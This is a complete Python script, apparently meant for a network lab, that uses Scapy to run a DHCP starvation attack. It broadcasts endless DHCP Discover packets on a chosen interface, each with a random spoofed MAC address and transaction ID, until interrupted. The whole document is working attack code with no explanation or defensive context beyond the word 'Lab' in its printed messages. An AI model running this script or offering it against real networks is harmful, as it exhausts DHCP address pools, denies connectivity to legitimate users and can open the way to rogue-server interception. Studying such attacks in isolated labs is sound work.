import sys
import time
from scapy.all import *

conf.verb = 0

iface = input("Enter interface name, example eth0: ")
delay = float(input("Enter delay between packets, example 0.2: "))

count = 0

print("\nStarting DHCP Starvation Lab Test...")
print("Press Ctrl+C to stop.\n")

try:
    while True:
        rand_mac = RandMAC()

        ether = Ether(src=rand_mac, dst="ff:ff:ff:ff:ff:ff")
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)

        bootp = BOOTP(
            chaddr=mac2str(rand_mac),
            xid=RandInt()
        )

        dhcp = DHCP(options=[
            ("message-type", "discover"),
            "end"
        ])

        packet = ether / ip / udp / bootp / dhcp

        sendp(packet, iface=iface)

        count += 1
        print(f"Sent DHCP Discover #{count} | Fake MAC: {rand_mac}")

        time.sleep(delay)

except KeyboardInterrupt:
    print(f"\nLab stopped. Total packets sent: {count}")
    sys.exit()

